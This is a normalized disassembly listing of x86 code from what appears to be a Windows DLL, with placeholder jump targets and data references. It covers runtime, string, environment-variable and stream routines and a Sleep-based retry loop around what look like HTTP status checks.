mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_1003a6ce
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
mov [ ebp - 0xc ] ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ eax ]
push edi
mov [ ebp - 0x4 ] esi
cmp esi ebx
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
or eax 0xffffffff
jmp r-xdata
call sub_1005b670
mov [ eax ] 0x16
push 0x3d
push esi
call sub_100016ba
mov edi eax
pop ecx
pop ecx
mov [ ebp - 0x14 ] edi
cmp edi ebx
je r-xdata
pop ebx
leave
retn
cmp esi edi
je r-xdata
xor eax eax
cmp [ edi + 0x1 ] bl
sete al
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
cmp eax ebx
jne r-xdata
call sub_10084be2
mov [ rw-data ] eax
mov esi [ rw-data ]
mov [ ebp - 0x10 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
or eax 0xffffffff
sub edi [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_10084b90
mov edi eax
pop ecx
cmp edi ebx
jl r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
call sub_1005f1fb
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
call sub_1005b4dc
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_1001b2d2
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
cmp edi ebx
jge r-xdata
lea esi [ esi + edi * 4 ]
push [ esi ]
call sub_1001b2d2
pop ecx
cmp [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
pop esi
mov [ eax ] ebx
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ edi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
cmp [ esi ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
push 0x4
call sub_1005f1fb
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
cmp eax 0x3fffffff
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ ebp - 0x10 ]
inc edi
lea esi [ eax + edi * 4 ]
cmp edi 0x3fffffff
jae r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov [ eax ] ebx
push eax
push 0x4
push [ rw-data ]
call sub_1003ac8f
add esp 0xc
cmp eax ebx
je r-xdata
push 0x4
push edi
push [ rw-data ]
call sub_1003ac8f
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov esi [ ebp - 0x4 ]
push 0x1
push esi
call sub_1007fa40
pop ecx
add eax 0x2
push eax
call sub_100579de
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea ecx [ eax + edi * 4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_1001b2d2
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
push esi
push esi
call sub_1007fa40
pop ecx
add eax 0x2
push eax
push edi
call sub_10042442
add esp 0xc
test eax eax
jne r-xdata
mov [ rw-data ] eax
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1005aa2b
mov ecx [ ebp - 0x8 ]
mov eax edi
sub eax esi
add eax [ ebp - 0x14 ]
mov [ eax ] bl
inc eax
neg ecx
sbb ecx ecx
not ecx
and ecx eax
push ecx
push edi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
push edi
call sub_1001b2d2
pop ecx
or [ ebp - 0xc ] 0xffffffff
call sub_1005b670
mov [ eax ] 0x2a
sub_1003a92d
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi ecx
and [ esi + 0x10 ] 0x0
push [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
call sub_1003255f
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003a960
push ebp
mov ebp esp
push 0xffffffff
push sub_100878c0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov eax [ eax + 0x4 ]
test [ eax + edi + 0x14 ] 0x2
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor esi esi
test [ eax + edi + 0xc ] 0x6
jne r-xdata
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
add ecx edi
test esi esi
je r-xdata
mov eax [ eax + edi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
push 0x0
call sub_10039ae0
or eax 0x4
sub_1003a9f6
push 0x14
push r--data
call sub_1007fad0
and [ ebp - 0x20 ] 0x0
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_1002d269
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_10032de0
or [ esi + 0x70 ] 0x10
and [ ebp - 0x4 ] 0x0
xor edi edi
inc edi
push edi
push 0xd8
call sub_100579de
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x24 ] ebx
test ebx ebx
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003ab65
mov eax [ ebp - 0x20 ]
push 0xc
call sub_1002f3c9
pop ecx
mov [ ebp - 0x4 ] edi
mov ecx [ esi + 0x6c ]
mov eax ebx
call sub_10080d3a
and [ ebp - 0x4 ] 0x0
call sub_1003ab28
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx ebx
call sub_100811ff
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
call sub_1007fb15
retn
push ebx
call sub_10038bf1
push ebx
call sub_1000a2a1
pop ecx
pop ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0xc
call sub_1002f3c9
pop ecx
mov [ ebp - 0x4 ] 0x2
lea edi [ esi + 0x6c ]
push ebx
push edi
call sub_10009fd9
push ebx
call sub_10038bf1
add esp 0xc
test [ esi + 0x70 ] 0x2
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_1007fbc0
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1003ab34
jmp r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] edi
push [ edi ]
push rw-data
call sub_10009fd9
pop ecx
pop ecx
mov eax [ rw-data ]
mov ecx [ eax + 0xbc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rw-data ] ecx
mov eax [ eax + 0xac ]
mov [ rw-data ] eax
sub_1003ab70
push ebp
mov ebp esp
push 0xffffffff
push sub_10086b18
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi ] r--data
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0xb8 ] bl
je r-xdata
mov eax [ esi + 0xbc ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
mov ecx esi
call sub_10021ec0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0xbc ] ebx
mov eax [ esi + 0xc4 ]
cmp eax ebx
je r-xdata
push eax
mov eax [ esi + 0xd8 ]
call eax
mov [ esi + 0xc0 ] ebx
mov ecx [ esi + 0xd8 ]
push eax
call ecx
mov [ esi + 0xc4 ] ebx
sub_1003ac30
push esi
mov esi eax
mov eax [ edi + 0x4 ]
cmp esi eax
jae r-xdata
cmp eax [ edi + 0x8 ]
jne r-xdata
mov ecx [ edi ]
cmp ecx esi
ja r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx edi
call sub_10045880
sub esi ecx
sar esi 0x3
cmp eax [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x8
pop esi
retn
mov ecx [ esi ]
mov [ eax ] ecx
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov ecx [ edi + 0x4 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_10045880
mov eax [ edi ]
mov edx [ eax + esi * 8 ]
mov [ ecx ] edx
mov eax [ eax + esi * 8 + 0x4 ]
mov [ ecx + 0x4 ] eax
add [ edi + 0x4 ] 0x8
pop esi
retn
sub_1003ac8f
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10004d98
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_1003acf0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ edi + 0x14 ] 0x10
jae r-xdata
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
mov edx [ edi ]
mov [ esi ] edx
mov [ edi ] 0x0
mov ecx [ edi + 0x10 ]
inc ecx
push ecx
push edi
push esi
call sub_1007ec40
add esp 0xc
jmp r-xdata
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov ecx [ edi + 0x14 ]
mov [ esi + 0x14 ] ecx
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
sub_1003ad70
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1c
push ebx
push esi
mov esi eax
xor eax eax
sub ecx eax
push edi
je r-xdata
mov [ esp + 0xc ] eax
dec ecx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ edi ]
cmp esi [ edx ]
je r-xdata
mov [ esp + 0xc ] 0x1
jmp r-xdata
dec ecx
jne r-xdata
mov eax edx
mov ecx [ eax + 0x30 ]
mov edx [ ecx + 0x4 ]
mov bl 0x6
test [ eax + edx + 0x3c ] bl
jne r-xdata
add edi 0x4
cmp edi ecx
jne r-xdata
mov edi [ edx + 0x3a0 ]
mov ecx [ edx + 0x3a4 ]
cmp edi ecx
je r-xdata
mov [ esp + 0xc ] 0x2
jmp r-xdata
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0x14 ] ecx
xor ecx ecx
mov [ esp + 0x1c ] ecx
mov ecx [ eax + edx + 0x68 ]
mov eax [ ecx ]
mov eax [ eax + 0x28 ]
push 0x2
push 0x1
push 0x0
push 0x0
lea edx [ esp + 0x20 ]
push edx
call eax
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi [ edi ]
mov eax [ esi + 0x30 ]
mov edx [ eax + 0x4 ]
add esi 0x30
test [ edx + esi + 0xc ] bl
jne r-xdata
mov ecx [ eax + 0x20 ]
mov edx [ ecx + 0x4 ]
test [ edx + eax + 0x2c ] 0x1
je r-xdata
mov edx [ edi ]
add eax ecx
mov [ edx + 0xc8 ] eax
mov eax [ edi ]
cmp [ eax + 0xc8 ] 0xffffffff
jne r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x20 ]
mov edx [ ecx + 0x4 ]
mov bl 0x6
test [ eax + edx + 0x2c ] bl
jne r-xdata
mov ecx [ edx + esi + 0x38 ]
mov edx [ esp + 0xc ]
mov eax [ ebp + 0x8 ]
mov ebx [ ecx ]
push 0x2
push edx
cdq
push edx
mov edx [ ebx + 0x28 ]
push eax
lea eax [ esp + 0x20 ]
push eax
call edx
mov eax [ esp + 0x18 ]
cdq
add eax [ esp + 0x10 ]
adc edx [ esp + 0x14 ]
cmp eax [ r--data ]
jne r-xdata
lea ecx [ eax + edx + 0x20 ]
mov eax [ ecx + 0x38 ]
neg eax
sbb eax eax
and eax 0xfffffffc
add eax 0x4
push 0x0
call sub_10039ae0
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0x14 ] ecx
xor ecx ecx
mov [ esp + 0x1c ] ecx
mov ecx [ eax + edx + 0x58 ]
mov eax [ ecx ]
mov eax [ eax + 0x28 ]
push 0x1
push 0x1
push 0x0
push 0x0
lea edx [ esp + 0x20 ]
push edx
call eax
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
jmp r-xdata
cmp edx [ r--data ]
jne r-xdata
mov eax [ edi ]
mov edx [ eax + 0x20 ]
mov ecx [ edx + 0x4 ]
test [ eax + ecx + 0x2c ] 0x6
jne r-xdata
mov eax [ esp + 0xc ]
mov ecx [ ecx + esi + 0x38 ]
mov ebx [ ecx ]
push 0x1
push eax
mov eax [ ebp + 0x8 ]
cdq
push edx
push eax
mov eax [ ebx + 0x28 ]
lea edx [ esp + 0x20 ]
push edx
call eax
mov eax [ esp + 0x18 ]
cdq
add eax [ esp + 0x10 ]
adc edx [ esp + 0x14 ]
cmp eax [ r--data ]
jne r-xdata
mov edx [ edi ]
add eax ecx
mov [ edx + 0xcc ] eax
mov esi [ edi ]
mov eax [ esi + 0x20 ]
mov ecx [ eax + 0x4 ]
add esi 0x20
test [ ecx + esi + 0xc ] bl
jne r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0x14 ] ecx
xor ecx ecx
mov [ esp + 0x1c ] ecx
add eax ecx
mov ecx [ eax + ecx + 0x58 ]
mov edx [ ecx ]
mov edx [ edx + 0x28 ]
push 0x1
push 0x1
push 0x0
push 0x0
lea eax [ esp + 0x20 ]
push eax
call edx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
add eax ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp edx [ r--data ]
jne r-xdata
push 0x0
call sub_10039ae0
or eax 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x0
call sub_10039ae0
or eax 0x4
sub_1003afd0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
cmp ebx 0xfffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_10030594
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
push eax
push ebx
call sub_10045c60
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
test ebx ebx
jne r-xdata
cmp ebx 0x10
jae r-xdata
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov [ esi + 0x10 ] ebx
cmp eax 0x10
jb r-xdata
push edi
mov edi [ esi + 0x10 ]
cmp ebx edi
jae r-xdata
mov [ esi ] 0x0
mov esi [ esi ]
cmp eax 0x10
jb r-xdata
mov edi ebx
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0xf
xor ecx ecx
mov [ edi + esi ] 0x0
cmp ecx ebx
pop edi
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_1000a86e
mov ebx [ ebp + 0x8 ]
add esp 0x4
push edi
push ebx
push esi
call sub_1007f580
add esp 0xc
sub_1003b080
push ebp
mov ebp esp
push 0xffffffff
push sub_10087681
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1b8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x198 ] eax
cmp [ eax + 0xec ] ebx
jne r-xdata
push ebx
push r--data
lea ecx [ ebp - 0xbc ]
mov [ ebp - 0x1a4 ] ebx
mov [ ebp - 0x1a8 ] ebx
mov [ ebp - 0x1ac ] ebx
mov [ ebp - 0x191 ] bl
mov [ ebp - 0x1b4 ] ebx
mov [ ebp - 0x19c ] ebx
mov [ ebp - 0x1a0 ] ebx
mov [ ebp - 0xa8 ] 0xf
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xbc ] bl
call sub_1003e780
cmp [ ebp + 0x10 ] 0x2
mov [ ebp - 0x4 ] ebx
jne r-xdata
lea eax [ ebx + 0x42 ]
jmp r-xdata
mov edi [ ebp - 0x1b4 ]
lea esp [ esp ]
push ebx
push r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] 0xf
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x84 ] bl
call sub_1003e780
push 0x8
lea eax [ ebp - 0x180 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10015820
mov edi [ ebp - 0x198 ]
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x74 ] ebx
lea esi [ ebp - 0x190 ]
sete al
xor ecx ecx
cmp al bl
sete cl
add ecx 0x6
push ecx
call sub_1006ff30
mov [ ebp - 0x4 ] 0x3
push 0x2
push r--data
lea ecx [ ebp - 0xd8 ]
mov [ ebp - 0xc4 ] 0xf
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0xd8 ] bl
call sub_1003e780
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0xc
cmp [ ebp - 0xa8 ] 0x10
jb r-xdata
cmp edi ebx
je r-xdata
push esi
lea eax [ ebp - 0x190 ]
call sub_10003290
mov esi [ ebp - 0x198 ]
push eax
push esi
lea edi [ ebp - 0xd8 ]
call sub_10017cc0
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_100651be
mov eax 0x43
jmp r-xdata
mov ecx [ ebp - 0xbc ]
push ecx
call sub_1000a86e
add esp 0x4
mov edx [ ebp - 0x198 ]
mov ecx [ edx + 0xec ]
mov eax [ ecx ]
mov eax [ eax + 0x8 ]
lea edx [ ebp - 0x1ac ]
push edx
lea edx [ ebp - 0x1a8 ]
push edx
lea edx [ ebp - 0x1a4 ]
push edx
mov edx [ ebp - 0x1a0 ]
push edx
mov edx [ ebp - 0x19c ]
push edx
mov edx [ ebp + 0xc ]
push edx
call eax
mov ecx [ ebp - 0x1a8 ]
mov esi eax
mov eax [ ebp - 0x1a4 ]
inc edi
cmp eax 0x12e
je r-xdata
push 0xdac
call [ Sleep@IAT ]
push edi
push esi
lea eax [ ebp - 0x190 ]
call sub_100215e0
lea edx [ ebp - 0x180 ]
push edx
mov [ ebp - 0x1a0 ] eax
lea eax [ ebp - 0x12c ]
push r--data
push eax
call sub_10003080
add esp 0xc
mov [ ebp - 0x4 ] 0x5
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_100651be
mov [ ebp - 0x191 ] 0x1
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
lea eax [ edi + 0x1c ]
push eax
lea eax [ ebp - 0x190 ]
call sub_10003290
push eax
push esi
lea edi [ ebp - 0x12c ]
call sub_10017cc0
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_100651be
cmp esi ebx
jne r-xdata
push ecx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x1a4 ]
mov [ ebp - 0x1a8 ] ebx
lea eax [ edi + 0x1c ]
push eax
push esi
lea eax [ ebp - 0x190 ]
call sub_100215e0
push 0x3
push r--data
lea ecx [ ebp - 0x110 ]
mov [ ebp - 0x19c ] eax
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] ebx
mov [ ebp - 0x110 ] bl
call sub_1003e780
mov [ ebp - 0x4 ] 0x6
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_100651be
cmp edi 0x5
jg r-xdata
cmp eax 0xc8
je r-xdata
lea eax [ edi + 0x38 ]
push eax
lea eax [ ebp - 0x190 ]
call sub_10003290
push eax
push esi
lea edi [ ebp - 0x110 ]
call sub_10017cc0
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_100651be
cmp [ ebp - 0x191 ] 0x1
jne r-xdata
cmp eax 0x12e
jne r-xdata
lea eax [ edi + 0x38 ]
push eax
push esi
lea eax [ ebp - 0x190 ]
call sub_100215e0
push 0x1
push r--data
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x1bc ] eax
mov [ ebp - 0x8c ] 0xf
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0xa0 ] bl
call sub_1003e780
mov [ ebp - 0x4 ] 0x7
push 0x1
lea ecx [ ebp - 0xa0 ]
cmp [ esi ] ebx
jne r-xdata
push r--data
call sub_100651be
cmp [ ebp - 0xa8 ] 0x10
jb r-xdata
push r--data
push r--data
jmp r-xdata
xor eax eax
mov edx [ ebp - 0xbc ]
push edx
call sub_1000a86e
add esp 0x4
lea eax [ edi + 0x54 ]
push eax
lea eax [ ebp - 0x190 ]
call sub_10003290
push eax
push esi
lea edi [ ebp - 0xa0 ]
call sub_10017cc0
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
push r--data
call sub_100651be
call sub_10012830
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x3
ja r-xdata
mov ecx [ ebp - 0x198 ]
lea eax [ esi + 0x54 ]
push eax
push ecx
lea eax [ ebp - 0x190 ]
call sub_100215e0
push 0x1
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x1b0 ] eax
call sub_10051c40
push eax
lea edx [ ebp - 0x148 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x8
call sub_100282d0
add esp 0x10
mov [ ebp - 0x4 ] 0xa
cmp [ ebp - 0x38 ] 0x10
jb r-xdata
push r--data
call sub_100651be
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0x38 ] 0xf
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp ecx 0x4
ja r-xdata
mov eax [ ebp - 0x4c ]
push eax
call sub_1000a86e
add esp 0x4
lea eax [ esi + 0x70 ]
push eax
lea eax [ ebp - 0x190 ]
call sub_10003290
mov edx [ ebp - 0x198 ]
push eax
push edx
lea edi [ ebp - 0x148 ]
call sub_10017cc0
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
push r--data
call sub_100651be
mov ecx [ ebp - 0x198 ]
lea eax [ esi + 0x70 ]
push eax
push ecx
lea eax [ ebp - 0x190 ]
call sub_100215e0
push 0x227a9
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x1c4 ] eax
call sub_10051c40
push eax
lea edx [ ebp - 0x164 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0xb
call sub_100282d0
add esp 0x10
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0x1c ] 0x10
jb r-xdata
push r--data
call sub_100651be
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp ecx 0x5
ja r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_1000a86e
add esp 0x4
lea eax [ esi + 0x8c ]
push eax
lea eax [ ebp - 0x190 ]
call sub_10003290
mov esi [ ebp - 0x198 ]
push eax
push esi
lea edi [ ebp - 0x164 ]
call sub_10017cc0
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x5
ja r-xdata
push r--data
call sub_100651be
lea eax [ edi + 0x8c ]
push eax
push esi
lea eax [ ebp - 0x190 ]
call sub_100215e0
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0xe0 ] 0xf
mov [ ebp - 0xe4 ] ebx
mov [ ebp - 0xf4 ] bl
mov [ ebp - 0x4 ] 0xe
cmp [ ebp - 0x74 ] ebx
je r-xdata
push r--data
call sub_100651be
mov ecx [ ebp - 0x1a0 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x11
call sub_10069410
mov edi eax
mov [ ebp - 0x4 ] 0x12
mov esi [ ebp - 0x18c ]
mov ecx [ ebp - 0x190 ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
lea ecx [ ebp - 0x84 ]
push ecx
lea edx [ ebp - 0x30 ]
push r--data
push edx
call sub_10003080
add esp 0xc
push eax
lea ecx [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0xf
call sub_1003acf0
mov [ ebp - 0x4 ] 0xe
cmp [ ebp - 0x1c ] 0x10
jb r-xdata
push 0xffffffff
push ebx
push edi
call sub_10004e10
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_100651be
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x6
ja r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_1000a86e
add esp 0x4
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
